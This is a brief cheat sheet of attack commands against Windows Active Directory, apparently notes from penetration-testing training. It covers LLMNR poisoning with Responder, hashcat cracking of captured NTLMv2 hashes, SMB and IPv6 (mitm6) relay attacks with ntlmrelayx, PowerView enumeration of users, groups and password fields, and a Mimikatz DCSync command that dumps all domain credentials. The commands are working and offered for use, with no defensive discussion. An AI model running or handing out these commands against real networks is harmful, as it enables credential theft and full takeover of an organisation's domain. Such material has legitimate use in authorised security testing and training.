https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa
1. LLMNR Poisoning
```
sudo ./Responder.py -I eth0 -rdwv
hashcat -m 5600 ntlmhash.txt ../../rockyou.txt/rockyou.txt --force
```

2. SMB relay
```
nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24
sudo ./Responder.py -I eth0 -rdwv
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```

6. Ipv6
```
sudo mitm6 -d marvel.local
sudo ntlmrelayx.py -6 -t ldaps://192.168.1.121 -wh fakewpad.marvel.local -l lootme
```

## Enumeration
### Powershell
```
Get-NetDomain
Get-DomainPolicy
(Get-DomainPolicy)."system access"
Get-NetDomainController
Get-NetUser
Get-UserProperty -Properties pwdlastset
Find-UserField -SearchField Description -SearchTerm "pass"
Get-NetComputer
Get-NetGroup
Get-NetGroup *admin*
Get-NetGroupMember -GroupName "Domain Admins"
Get-NetGroup -UserName "khalid"
Get-NetLocalGroup –ComputerName Client-02
Get-NetLoggedon -ComputerName Client-02
Get-LastLoggedOn -ComputerName CLient
Invoke-ShareFinder
```
https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf

### Mimikatz
```
Mimikatz /command:"lsadump::dcsync /all"
```
